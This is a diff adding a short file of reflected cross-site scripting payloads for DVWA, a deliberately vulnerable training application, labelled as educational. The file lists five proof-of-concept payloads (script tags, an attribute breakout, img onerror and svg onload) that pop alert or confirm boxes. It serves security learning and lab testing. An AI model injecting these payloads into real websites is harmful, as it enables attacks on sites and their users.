@@ -1,0 +1,16 @@
+# Reflected XSS Payloads – DVWA
+# Purpose: Educational testing only
+
+<script>alert('XSS')</script>
+
+"><script>alert('XSS')</script>
+
+<img src=x onerror=alert('XSS')>
+
+<svg/onload=alert('XSS')>
+
+<script>confirm('Reflected XSS')</script>
+
+# Notes:
+# These payloads were tested on DVWA XSS (Reflected)
+# Security Level: LOW
